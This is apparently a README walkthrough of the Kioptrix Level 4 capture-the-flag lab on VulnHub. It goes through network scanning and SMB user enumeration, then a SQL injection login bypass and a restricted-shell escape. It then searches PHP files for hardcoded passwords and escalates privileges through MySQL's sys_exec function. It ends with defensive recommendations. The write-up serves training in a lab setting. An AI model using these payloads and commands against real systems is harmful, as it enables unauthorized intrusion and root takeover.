<h1 align="center">🐧 Kioptrix Level 4 — Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access — A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
</p>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [Objectives](#-objectives)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Enumeration](#2-enumeration)
- [3. Initial Access via SQL Injection](#3-initial-access-via-sql-injection)
- [4. Gaining Shell Access](#4-gaining-shell-access)
- [5. Privilege Escalation](#5-privilege-escalation)
- [Security Recommendations](#-security-recommendations)
- [Tools Used](#-tools-used)

---

## 📋 Overview
This guide documents the complete penetration testing methodology for **Kioptrix Level 4**, detailing every step from initial reconnaissance to privilege escalation and flag capture.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate users and services
- Exploit vulnerabilities to gain initial access
- Escalate privileges to obtain root access
- Capture the flag

---

## 1. Reconnaissance

### 🔎 Network Discovery
Check the IP allocated to the attacking machine and determine the subnet range.

```bash
$ ifconfig
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/A.%20IFCONFIG.PNG" alt="ifconfig output" width="600"/>
</p>

### 🌐 Host Discovery
Ping sweep to identify live hosts within the subnet.

```bash
$ nmap -sn 192.168.56.1/24
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/B.%20NMAP.PNG" alt="nmap host discovery" width="600"/>
</p>

### 🛰️ Port Scan
Scan all ports (0–65000). The `-A` flag enables aggressive mode, bundling OS and service detection.

```bash
$ nmap -p 0-65000 -A 192.168.56.15
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/C.%20Nmap%20port%20scan..PNG" alt="nmap port scan" width="600"/>
</p>

**Findings:** Ports **22** (SSH), **80** (HTTP), **139** (SMB), and **445** (SMB) are open.

---

## 2. Enumeration

Navigate to port 80: `http://192.168.56.15:80`

A login page appears with an authentication form requiring a username and password.

### 📡 SMB Enumeration

```bash
$ enum4linux 192.168.56.15
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/D.%20Enum4linux..PNG" alt="enum4linux output" width="600"/>
</p>

Discovered users:

| RID | Username |
|-----|----------|
| 0x1f5 | nobody |
| 0xbbc | robert |
| 0x3e8 | root |
| 0xbba | john |
| 0xbb8 | loneferret |

Extracted usernames (via `cat`):
- `robert`
- `root`
- `john`
- `loneferret`

---

## 3. Initial Access via SQL Injection

### 🔓 Authentication Bypass
**Target:** `http://192.168.56.10`

| Field | Value |
|-------|-------|
| Username | `john` |
| Password | `' OR 1=1#` |

**Result:** Successful auth bypass, revealing John's password: **`MyNameIsJohn`**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/E.%20Webpage..PNG" alt="SQLi auth bypass result" width="600"/>
</p>

---

## 4. Gaining Shell Access

With John's credentials in hand, connect via SSH (port 22 was confirmed open in the earlier scan).

### 🔑 SSH Connection

```bash
$ ssh -p 22 john@192.168.56.15 -oHostKeyAlgorithms=+ssh-rsa
```

- Type `yes` when prompted to accept the host key
- Enter the password: `MyNameIsJohn`

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/F.%20Escal1.PNG" alt="SSH login" width="600"/>
</p>

### 🚪 Restricted Shell Escape
Check which commands are available in the restricted shell:

```bash
john:~$ ?
```

`echo` is available — use it to spawn a full shell:

```bash
john:~$ echo os.system('/bin/bash')
```

The prompt changes from `john:~$` to `john@Kioptrix4:~$`, confirming the shell escape.

---

## 5. Privilege Escalation

### 🕵️ Information Gathering
Search PHP files for hardcoded credentials:

```bash
john@Kioptrix4:~$ find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null
```

| Flag | Purpose |
|------|---------|
| `find /` | Start search from filesystem root |
| `-maxdepth 5` | Limit search depth to 5 levels |
| `-name *.php` | Only match `.php` files |
| `-type f` | Only match regular files |
| `-exec grep -Hn password {} \;` | Search matched files for the string "password" |

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/F.%20Escal1.PNG" alt="password search results" width="600"/>
</p>

A MySQL root account with a **blank password** is found.

### 🗄️ MySQL Exploitation

```bash
john@Kioptrix4:~$ mysql -u root
```

Enumerate available MySQL functions:

```sql
mysql> select * from mysql.func;
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/G.%20MYSQL1..PNG" alt="MySQL function enumeration" width="600"/>
</p>

A critical function, **`sys_exec`**, is found — it allows arbitrary system command execution.

### 👤 Group Escalation

```sql
mysql> select sys_exec('usermod -a -G admin john');
```

This adds (`-a`) John (`usermod`) to the `admin` group (`-G`).

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/H.%20MYSQL2..PNG" alt="usermod group escalation" width="600"/>
</p>

Exit MySQL:

```sql
mysql> quit
```

### 🏁 Final Privilege Escalation

```bash
john@Kioptrix4:~$ sudo su
```

- Enter password `MyNameIsJohn` when prompted
- Prompt changes to `root@Kioptrix4:/home/john#`, confirming root access

```bash
root@Kioptrix4:/home/john# whoami
root@Kioptrix4:/home/john# cd /root
root@Kioptrix4:~# ls -alps
root@Kioptrix4:~# cat congrats.txt
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/I.%20CONGRATS..PNG" alt="Root flag captured" width="600"/>
</p>

🎉 **Root access achieved — flag captured!**

---

## 🔒 Security Recommendations

- **Input Validation** — Implement proper input sanitization to prevent SQL injection
- **Password Policies** — Enforce strong password requirements
- **Service Hardening** — Disable unnecessary services and ports
- **Privilege Separation** — Limit MySQL functions and user privileges
- **Regular Updates** — Keep all software patched and up to date
- **Log Monitoring** — Implement comprehensive logging and alerting

---

## 🔧 Tools Used

**🛡️ Network & Service Discovery**
`ifconfig` · `nmap` · `enum4linux`

**🔓 Exploitation**
Manual SQL Injection · `ssh` · `mysql`

**🔍 Information Gathering**
`find` · `grep` · `cat` · `ls`

**💻 System Tools**
`bash` · `sudo` · `usermod` · `mysql`

---

<p align="center">
  <strong>Documentation created for educational purposes</strong><br>
  All techniques should be practiced only in controlled, authorized environments.
</p>

